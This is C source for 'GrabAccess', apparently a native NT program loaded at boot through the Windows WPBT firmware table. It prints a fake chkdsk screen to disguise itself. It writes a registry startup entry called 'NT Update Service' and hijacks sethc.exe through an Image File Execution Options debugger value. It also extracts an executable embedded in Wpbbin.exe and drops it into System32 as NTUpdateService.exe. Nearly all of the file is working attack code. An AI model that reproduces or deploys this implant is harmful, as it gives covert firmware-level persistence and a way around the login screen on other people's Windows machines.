//GrabAccess Native APP 1.0.0
//This app will be loaded by WPBT
//After running in the windows startup phase, it write startup items and hijack sethc.exe
//ref: https://fox28813018.blogspot.com/2019/05/windows-platform-binary-table-wpbt-wpbt.html

//======================================================================
//
// This is a demonstration of a Native NT program. These programs
// run outside of the Win32 environment and must rely on the raw
// services provided by NTDLL.DLL. AUTOCHK (the program that executes
// a chkdsk activity during the system boot) is an example of a
// native NT application.
//
// This example is a native 'hello world' program. When installed with
// the regedit file associated with it, you will see it print 
// "hello world" on the initialization blue screen during the system
// boot. This program cannot be run from inside the Win32 environment.
//
//======================================================================
#include "ntddk.h"
#include "stdio.h"
#include "native.h"
 
#define HEAP_NO_SERIALIZE               0x00000001      // winnt
#define HEAP_GROWABLE                   0x00000002      // winnt
#define HEAP_GENERATE_EXCEPTIONS        0x00000004      // winnt
#define HEAP_ZERO_MEMORY                0x00000008      // winnt
#define HEAP_REALLOC_IN_PLACE_ONLY      0x00000010      // winnt
#define HEAP_TAIL_CHECKING_ENABLED      0x00000020      // winnt
#define HEAP_FREE_CHECKING_ENABLED      0x00000040      // winnt
#define HEAP_DISABLE_COALESCE_ON_FREE   0x00000080      // winnt
 
// Our heap
HANDLE Heap;
HANDLE g_hHeap = NULL;

WCHAR AutoRun[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
WCHAR AutoRunName[]	=	L"NT Update Service";
WCHAR IFEO[]	=	L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";  //hijack sethc.exe
WCHAR IFEO_redirect[]	=	L"C:\\windows\\system32\\taskmgr.exe";  //redirect sethc.exe to taskmgr.exe

RtlGetProcessHeap(
  IN ULONG                MaxNumberOfHeaps,
  OUT PVOID               *HeapArray );
  
//FOX
void print(PWCHAR pwmsg)
{
	UNICODE_STRING msg;
	RtlInitUnicodeString(&msg,pwmsg);
	NtDisplayString(&msg);
}

// Common 



HANDLE InitHeapMemory(void)
{
	g_hHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0x100000, 0x1000, NULL,NULL);
	
	return g_hHeap;
}

BOOLEAN DeinitHeapMemory()
{
	PVOID pRet;

	pRet = RtlDestroyHeap(g_hHeap);
	if (pRet == NULL) {
		g_hHeap = NULL;
		return TRUE;
	}
	return FALSE;
}

void free(void *pMem)
{
	RtlFreeHeap(g_hHeap, 0, pMem);
}


void *malloc(unsigned long ulSize)
{
	return RtlAllocateHeap(g_hHeap, 0, ulSize);
}


  
BOOLEAN NtFileGetFileSize(HANDLE hFile, LONGLONG* pRetFileSize)
{
  IO_STATUS_BLOCK sIoStatus;
  FILE_STANDARD_INFORMATION sFileInfo;
  NTSTATUS ntStatus = 0;

  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));
  memset(&sFileInfo, 0, sizeof(FILE_STANDARD_INFORMATION));

  ntStatus = NtQueryInformationFile(hFile, &sIoStatus, &sFileInfo,
    sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
  if (ntStatus == STATUS_SUCCESS)
  {
    if (pRetFileSize)
    {
      *pRetFileSize = (sFileInfo.EndOfFile.QuadPart);
    }
    return TRUE;
  }

  return FALSE;
}


BOOLEAN NtFileReadFile(HANDLE hFile, PVOID pOutBuffer, ULONG dwOutBufferSize, ULONG* pRetReadedSize)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;

  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));

  ntStatus = NtReadFile( hFile, NULL, NULL, NULL, &sIoStatus, pOutBuffer, dwOutBufferSize, NULL, NULL);
  if (ntStatus == STATUS_SUCCESS) 
  {
    if (pRetReadedSize) 
    {
      *pRetReadedSize = (ULONG)sIoStatus.Information;
    }

    return TRUE;
  }
  return FALSE;
}

BOOLEAN NtFileWriteFile(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;

  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));	

  ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, NULL, NULL);

  if (ntStatus == STATUS_SUCCESS) 
  {
    if (pRetWrittenSize) 
    {
      *pRetWrittenSize = (ULONG)sIoStatus.Information;
    }
    return TRUE;
  }

  return FALSE;
}

BOOLEAN NtFileWriteFileByOffset(HANDLE hFile, PVOID lpData, ULONG dwBufferSize, ULONG* pRetWrittenSize , ULONG Offset)
{
  IO_STATUS_BLOCK sIoStatus;
  NTSTATUS ntStatus = 0;

  memset(&sIoStatus, 0, sizeof(IO_STATUS_BLOCK));	

  ntStatus = NtWriteFile(hFile, NULL, NULL, NULL, &sIoStatus, lpData, dwBufferSize, (PLARGE_INTEGER)Offset, NULL);

  if (ntStatus == STATUS_SUCCESS) 
  {
    if (pRetWrittenSize) 
    {
      *pRetWrittenSize = (ULONG)sIoStatus.Information;
    }
    return TRUE;
  }

  return FALSE;
}

void setRegistryValue(WCHAR *keyName,WCHAR *valueName,WCHAR *value)
{
	UNICODE_STRING KeyName, ValueName;
	HANDLE SoftwareKeyHandle;
	ULONG Status;
	OBJECT_ATTRIBUTES ObjectAttributes;
	ULONG Disposition;
//FOX
	UNICODE_STRING tempString;
	int Result = 0; //fox
	WCHAR storage[256];

	RtlInitUnicodeString(&KeyName,keyName);
	
	InitializeObjectAttributes(
		&ObjectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);
		
	Status = ZwCreateKey(
		&SoftwareKeyHandle,
		KEY_ALL_ACCESS,
		&ObjectAttributes,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		&Disposition);
///FOX
	//swprintf(storage, L"%s error code: %x\n",valueName, Status);
	//RtlInitUnicodeString(&tempString, storage);
	//NtDisplayString(&tempString);

	RtlInitUnicodeString(&ValueName,valueName);

	Status = ZwSetValueKey(
		SoftwareKeyHandle,
		&ValueName,
		0,
		REG_SZ,
		value,
		(wcslen( value )+1) * sizeof(WCHAR));

	Status = ZwClose(SoftwareKeyHandle);

}

//----------------------------------------------------------------------
 
// NtProcessStartup
 
// Instead of a 'main', NT applications are entered via this entry point.  
 
//----------------------------------------------------------------------
void NtProcessStartup( PSTARTUP_ARGUMENT Argument )
{
	UNICODE_STRING helloWorld;
	LARGE_INTEGER li; //fox
	int Result; //fox
	//Fox-20190520
	int index;
	int offset;
	int AppStart;
	int AppEnd;
	int AppSize;
	NTSTATUS status;
	HANDLE FileHandle;
	HANDLE TargetFileHandle;
	IO_STATUS_BLOCK isb;
	IO_STATUS_BLOCK Writeisb;
	OBJECT_ATTRIBUTES obj;
	UNICODE_STRING str;
	ULONG FileSize; //DWORD
	//LPVOID FileOutBuffer;
	BOOLEAN bResult = 0;
	ULONG dwReadedSize = 0;
	ULONG dwWriteSize = 0;
	//PVOID FileOutBuffer;
	unsigned char *WriteBuffer;
	unsigned char *byData;
	//unsigned char byData[8192];
	LONGLONG lFileSize = 0;	
	WCHAR filepath[100]= L"\\??\\\\C:\\Windows\\System32\\Wpbbin.exe";
	WCHAR targetfilepath[100]= L"\\??\\\\C:\\Windows\\System32\\NTUpdateService.exe";
	// WCHAR filepath[100]= L"C:\\Windows\\System32\\native.exe";
	WCHAR storage[256];
	//Fox-20190520
	
	// Start Memory Managerment
	if (InitHeapMemory() == NULL) {
		//DbgPrint("%s:%d InitHeapMemory failed\n",__FILE__,__LINE__);
	}
	
	//fox RtlInitUnicodeString(&helloWorld,L"Hello World!\n");
	//RtlInitUnicodeString(&helloWorld,L"Hello Fox!\n"); //fox
	//RtlInitUnicodeString(&helloWorld,L"This Native App for test WPBT function.\n"); //fox
	//NtDisplayString(&helloWorld);
	//print(L"by FoxYang\n");
	
	//Fake chkdsk GUI
	print(L"checking file system on C:\n");
	print(L"The type of the file system is NTFS.\n");
	print(L"\n");
	print(L"One of your disks needs to be checked for consistency.\n");
	print(L"You may cancel the disk check, but it is strongly recommenfed that you continue\n");
	print(L"Windows will now check the disk.\n");
	print(L"\n");
	
	setRegistryValue(AutoRun,AutoRunName,L"C:\\Windows\\system32\\NTUpdateService.exe"); //set startup item
	setRegistryValue(IFEO,L"Debugger",IFEO_redirect);	//hijack sethc.exe with taskmanager
	// Make delay 

	// outport string to memeory address
	RtlInitUnicodeString(&str, filepath);
	// initial Object for CreateFile use.
	InitializeObjectAttributes(
	&obj, 
	&str, 
	OBJ_CASE_INSENSITIVE, 
	NULL, 
	NULL);

// Open FIle for Read ..
 status = NtCreateFile(
 	 &FileHandle, 
 	 FILE_GENERIC_READ, 
 	 &obj, 
 	 &isb, 
 	 0,
	 FILE_ATTRIBUTE_NORMAL,
	 FILE_SHARE_READ, 
	 FILE_OPEN,
	 FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, 
	 NULL, 0);

// Read file content ..
// https://docs.microsoft.com/en-us/windows/desktop/devnotes/ntreadfile
//  IN HANDLE               FileHandle,
//  IN HANDLE               Event OPTIONAL,
//  IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
//  IN PVOID                ApcContext OPTIONAL,
//  OUT PIO_STATUS_BLOCK    IoStatusBlock,
//  OUT PVOID               Buffer,
//  IN ULONG                Length,
//  IN PLARGE_INTEGER       ByteOffset OPTIONAL,
//  IN PULONG               Key OPTIONAL );
/*  
status = NtReadFile(
	FileHandle,
	NULL,
	NULL,
	NULL,
	&isb,
	&FileOutBuffer,
	8192,
	0,
	NULL);
		

	// Read info ..
	FileSize = isb.Information;
*/
//////
	bResult = NtFileGetFileSize(FileHandle, &lFileSize);
//////	
	//swprintf(storage, L"File Size : %d\n", lFileSize);
	//RtlInitUnicodeString(&str, storage);
	//NtDisplayString(&str);
	
	// allocate buffer for read file ..
////////////
    //
    // Allocate Memory for the String Buffer
    // 
    //byData = RtlAllocateHeap(RtlGetProcessHeap(), 0, lFileSize);
	byData = malloc((unsigned long)lFileSize);

////////////	
	
	// read file to buffer
	//fox status = NtReadFile(
	//fox FileHandle,
	//fox NULL,
	//fox NULL,
	//fox NULL,
	//fox &isb,
	//fox &FileOutBuffer,
	//fox 8192,
	//fox 0,
	//fox NULL);
	//
//	status = NtReadFile(
//	FileHandle,
//	NULL,
//	NULL,
//	NULL,
//	&isb,
//	&FileOutBuffer,
//	(ULONG)lFileSize,
//	0,
//	NULL);	
	
	/// read file test

//  lWrittenSizeTotal = 0;
//  while (1) 
//  {
    dwReadedSize = 0;
    NtFileReadFile(FileHandle, byData, (ULONG)lFileSize, &dwReadedSize); 	
    offset = 0;
    // Show Byte ..
	//swprintf(storage, L"File offset %d: 0x%02x\n",dwReadedSize,*(volatile unsigned char *)(byData + offset ));
	//RtlInitUnicodeString(&str, storage);
	//NtDisplayString(&str);	  
	// Show DWORD
	//swprintf(storage, L"File offset %d: 0x%08x\n",dwReadedSize,*(volatile unsigned long *)(byData + offset ));
	//RtlInitUnicodeString(&str, storage);
	//NtDisplayString(&str);	  	  
	
	AppStart = 0;
	AppEnd = 0;
	AppSize = 0;
	
	for(index=0;index<lFileSize;index++)
	{
		// looking for <UU>
		// we will ignore first found <UU> ... 
		if (*(volatile unsigned long *)(byData + index ) == 0x3E55553C
		&& *(volatile unsigned long *)(byData + index - 4 ) == 0x00000000 )
		{
			//swprintf(storage, L"offset 0x%x: 0x%08x\n",index,*(volatile unsigned long *)(byData + index + 4 ));
			//RtlInitUnicodeString(&str, storage);
			//NtDisplayString(&str);	 
			
			if (AppStart != 0 && AppEnd == 0)
			{
				// AppEnd = *(volatile unsigned long *)(byData + index - 4 );
				AppEnd = index ;
				//swprintf(storage, L"End offset   0x%08x\n",AppEnd);
				//RtlInitUnicodeString(&str, storage);
				//NtDisplayString(&str);	
				
				AppSize = AppEnd - AppStart;	
				//swprintf(storage, L"Size 0x%x(%d)\n",AppSize,AppSize);
				//RtlInitUnicodeString(&str, storage);
				//NtDisplayString(&str);								
				break;
			}
						
			if (AppStart == 0)
			{
				AppStart = index + 4;
				//swprintf(storage, L"Start offset 0x%08x\n",AppStart);
				//RtlInitUnicodeString(&str, storage);
				//NtDisplayString(&str);	
			}
			
			
		}
	}
	
	
	// Start Write File to System32 .. 20190521
	// Prepare data for memory write ..
	WriteBuffer = malloc((unsigned long)AppSize);
	
	for(index=0;index<AppSize;index++)
	{
		*(volatile unsigned long *)(WriteBuffer  + index ) = *(volatile unsigned long *)(byData + AppStart + index );
		// *(volatile UINT8 *)(PackLocateMemory[j-1] + i) = *(volatile UINT8*)(AppLocateMemory + PackStart[j-1] + i);    
	}
	// outport string to memeory address
	RtlInitUnicodeString(&str, targetfilepath);
	// initial Object for CreateFile use.
	InitializeObjectAttributes(
	&obj, 
	&str, 
	OBJ_CASE_INSENSITIVE, 
	NULL, 
	NULL);

	// Create File for Write ..
 	status = NtCreateFile(
 	 &TargetFileHandle, 
 	 FILE_GENERIC_WRITE, 
 	 &obj, 
 	 &Writeisb, 
 	 0,
	 FILE_ATTRIBUTE_NORMAL,
	 FILE_SHARE_WRITE, 
	 FILE_OVERWRITE_IF,
	 FILE_RANDOM_ACCESS|FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, 
	 NULL, 0);	
	
	// Write file to Disk ..
	NtFileWriteFile(TargetFileHandle, WriteBuffer, AppSize, &dwWriteSize);
	// NtFileWriteFileByOffset(TargetFileHandle, byData, (ULONG)AppSize, &dwWriteSize , AppStart);
	// Write File End
	
	NtClose(TargetFileHandle);	
	NtClose(FileHandle);

	
    //
    // Free Memory
    //
     free(byData);
    			
	/*
	if(status>=0)
	{
		RtlInitUnicodeString(&str, L"File content:\n\r");
		NtDisplayString(&str);
		RtlInitUnicodeString(&str, Readrez);
		NtDisplayString(&str);
	}
	else{
		_snwprintf(filepath, 100, L"status = %x\n", status);
		RtlInitUnicodeString(&str, filepath);
		NtDisplayString(&str);	
	}
	*/
// Fox-20190520-Read file ..


    
    	li.QuadPart = -(5 * 10000000); // wait for relative 10 sec
    	// li.QuadPart = -(120 * 10000000); // wait for relative 10 sec
    	Result = NtDelayExecution( TRUE, &li );	
///// 
	// DESTORY MEMORY
	DeinitHeapMemory();
    // Terminate
    NtTerminateProcess( NtCurrentProcess(), 0 );
}